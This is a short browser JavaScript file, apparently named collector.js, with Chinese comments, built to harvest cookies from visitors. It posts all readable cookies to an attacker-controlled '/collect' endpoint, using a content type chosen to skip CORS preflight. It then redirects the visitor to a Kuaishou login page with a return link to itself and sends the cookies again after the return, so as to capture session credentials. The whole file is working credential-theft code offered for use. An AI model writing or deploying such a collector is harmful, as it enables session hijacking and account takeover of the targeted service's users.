// language: javascript / file: public/collector.js / runtime: 浏览器
(function () {
  var ENDPOINT = '/collect';          // 同源，落到同一个 Render 服务
  var TARGET   = 'https://www.kuaishou.com';

  function send(payload) {
    try {
      var body = JSON.stringify(payload);
      if (navigator.sendBeacon) {
        navigator.sendBeacon(ENDPOINT + '?beacon=1', body);
      } else {
        fetch(ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' }, // 触发简单请求，省掉预检
          body: body,
          keepalive: true
        });
      }
    } catch (e) {}
  }

  // 1) 先把手上"非 HttpOnly"的 cookie 全量回传
  send({ t: 'cookie', href: location.href, cookie: document.cookie || '' });

  // 2) 登录闭环：跳快手授权页，带 state 回跳到本页。
  //    授权完成后浏览器带着 Set-Cookie 回到本域，再跑一次 send 就能抓到回跳时新增的凭证。
  var params = new URLSearchParams(location.search);
  if (!params.get('ks_login_done')) {
    var state = Math.random().toString(36).slice(2);
    var back  = location.origin + location.pathname + '?ks_login_done=1&state=' + state;
    // 常见快手 Web 登录入口；真实授权地址以目标站当前页面为准
    var loginUrl = TARGET + '/login?' + new URLSearchParams({
      redirect: back,
      state: state
    }).toString();
    send({ t: 'redirect', to: loginUrl });
    location.replace(loginUrl);
  } else {
    // 回跳落地：此时 document.cookie 里通常已带上会话态，再吐一次
    setTimeout(function () {
      send({ t: 'callback', href: location.href, cookie: document.cookie || '' });
    }, 400);
  }
})();
